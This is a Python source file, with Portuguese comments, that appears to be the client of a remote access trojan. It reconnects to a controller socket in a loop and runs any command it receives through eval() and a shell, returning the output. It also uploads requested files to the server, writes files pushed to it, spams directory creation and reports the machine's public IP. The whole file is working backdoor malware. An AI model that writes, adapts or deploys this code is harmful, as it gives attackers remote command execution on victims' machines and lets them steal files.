from socket import *
from time import sleep
from subprocess import Popen, PIPE
from os.path import getsize, exists
from urllib.request import urlopen
import platform



CONFIG = {
    "ANDRESS"    : ('localhost', 1000),
    "API_GET_IP" : 'https://api.ipify.org/'
}

ANDRESS = ('localhost', 1000)

def ManagerCommands(command):
    '''Executa o comando e retorna o resultado.'''
    shell = Popen(command.split(), shell=True, stdout=PIPE, stderr=PIPE)
    stdout = shell.stdout.read()
    stderr = shell.stderr.read()
    if(stdout):
        return stdout
    elif(stderr):
        return stderr
    else:
        return b'\33[1;31m[FAIL]\33[m'

def AdaptedFromSystem(Windows='', Linux='', Other=''):
    platforma = platform.system()
    if(platforma == 'Windows'): return ManagerCommands(Windows)
    elif(platforma == 'Linux'): return ManagerCommands(Linux)
    else: return ManagerCommands(Other)

while True:
    server = socket(AF_INET, SOCK_STREAM)
    try:
        ## Tenta se conectar ao servidor
        server.connect(CONFIG['ANDRESS'])
        try:
            while True:
                ## Recebe o comando e transforma em um dicionario.
                data = eval(server.recv(1024).decode())

                ## Verifica se foi feito algum comando especial(nxt_getfile, nxt_sendfile,...)
                if(data['command'] == 'nxt_getfile'):
                    if(exists(data['file'])):
                        ## Pega o tamanho do arquivo e envia ao servidor.
                        size = str(getsize(data['file'])+1024)
                        server.send(size.encode())
                        ## Lê e envia o arquivo para o servidor.
                        with open(data['file'], 'rb') as f:
                            server.send(f.read())
                        continue
                
                
                elif(data['command'] == 'nxt_spamdir'):
                    try:
                        for i in range(1, data['amount']+1):
                            ManagerCommands(f'mkdir {data["dir"]}\\{data["name_path"]}_{i}')
                    except Exception as ERROR:
                        erro = f'{ERROR}'.encode()
                        server.send(erro) ## Sucesso
                        continue
                    else:
                        server.send(b'S') ## Sucesso


                elif(data['command'] == 'nxt_infoip'):
                    try:
                        IP = urlopen(CONFIG['API_GET_IP']).read()
                        server.send(IP)
                    except Exception as ex:
                        print(f'{ex}')
                        server.send(f'E: {ex}'.encode())
                    continue

                elif(data['command'] == 'nxt_sendfile'):
                    try:
                        if('\/' in data['file']):
                            if(exists(data['file'])):
                                pass
                            else:
                                server.send(b'dir_not_exists')
                                continue

                        file = server.recv(data['size'])
                        with open((data['file']), 'wb') as f:
                            f.write(file)
                        
                    except Exception as ex:
                        server.send(b'error')
                        continue
                    else:
                        server.send(b'sucess')
                        continue

                else:
                    ## Envia o resultado do comando para o servidor.
                    result = (ManagerCommands(data['command']))
                    server.send(result)
        except Exception as ex:
            server.close()
        sleep(6)
    ##Verifica se houve uma queda na conexão
    except WindowsError as errorcode:
        if(errorcode.winerror == 10038):
            server.close()
    except Exception as ex:
        continue









